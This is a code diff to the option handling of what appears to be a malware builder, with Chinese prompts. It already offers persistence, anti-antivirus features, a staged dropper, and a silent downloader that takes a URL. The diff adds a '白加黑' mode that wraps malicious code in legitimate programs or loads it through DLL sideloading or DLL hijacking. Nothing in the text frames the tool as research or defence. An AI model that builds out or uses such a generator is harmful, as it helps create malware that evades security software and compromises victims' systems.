@@ -49,6 +49,27 @@ def interactive_mode():
     anti_detection = input("添加反杀毒特征? (Y/n) >>> ").strip().lower() != 'n'
     use_dropper = input("使用分阶段执行模式? (Y/n) >>> ").strip().lower() != 'n'
     
+    # 白加黑功能选项
+    use_white_black = input("使用白加黑技术? (y/N) >>> ").strip().lower() == 'y'
+    white_black_mode = None
+    
+    if use_white_black:
+        print("\n🎭 白加黑模式选择:")
+        print("1. 合法程序包装 (推荐)")
+        print("2. DLL侧加载")
+        print("3. DLL劫持")
+        
+        while True:
+            choice = input("请选择模式 (1-3) >>> ").strip()
+            if choice in ['1', '2', '3']:
+                white_black_mode = {
+                    '1': 'wrapper',
+                    '2': 'sideloading', 
+                    '3': 'hijacking'
+                }[choice]
+                break
+            print("❌ 请输入有效选项 (1-3)")
+    
     # 新增：下载器选项
     use_downloader = input("生成下载器模式? (y/N) >>> ").strip().lower() == 'y'
     download_url = None
@@ -74,6 +95,8 @@ def interactive_mode():
         'persistence': add_persistence,
         'anti_detection': anti_detection,
         'use_dropper': use_dropper,
+        'use_white_black': use_white_black,
+        'white_black_mode': white_black_mode,
         'use_downloader': use_downloader,
         'download_url': download_url,
         'downloader_silent': downloader_silent
@@ -93,6 +116,9 @@ def command_line_mode():
     parser.add_argument('--persistence', action='store_true', help='添加持久化功能')
     parser.add_argument('--anti-detection', action='store_true', help='添加反杀毒特征')
     parser.add_argument('--use-dropper', action='store_true', help='使用分阶段执行模式')
+    parser.add_argument('--use-white-black', action='store_true', help='使用白加黑技术')
+    parser.add_argument('--white-black-mode', choices=['wrapper', 'sideloading', 'hijacking'], 
+                       default='wrapper', help='白加黑模式: wrapper(包装), sideloading(侧加载), hijacking(劫持)')
     parser.add_argument('--use-downloader', action='store_true', help='生成下载器模式')
     parser.add_argument('--download-url', help='下载地址 (主程序URL)')
     parser.add_argument('--downloader-silent', action='store_true', help='下载器静默模式')
